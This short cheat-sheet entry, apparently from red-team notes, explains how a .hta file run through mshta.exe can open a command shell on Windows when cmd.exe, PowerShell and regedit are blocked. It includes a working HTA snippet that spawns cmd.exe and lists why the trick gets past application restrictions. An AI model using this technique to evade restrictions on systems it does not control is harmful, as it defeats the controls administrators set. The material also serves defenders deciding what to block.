# HTA file
Even when common tools like cmd.exe, PowerShell and regedit are blocked, mshta.exe can often still be used to launch commands via .hta files.

```
<script>
  var shell = new ActiveXObject("WScript.Shell");
  shell.Run("cmd.exe");
</script>
```

âœ… Why it works:
- .hta runs via mshta.exe, a legitimate Windows binary.
- It often bypasses app restrictions if not explicitly blocked.
- Not an exploit, just living off the land.
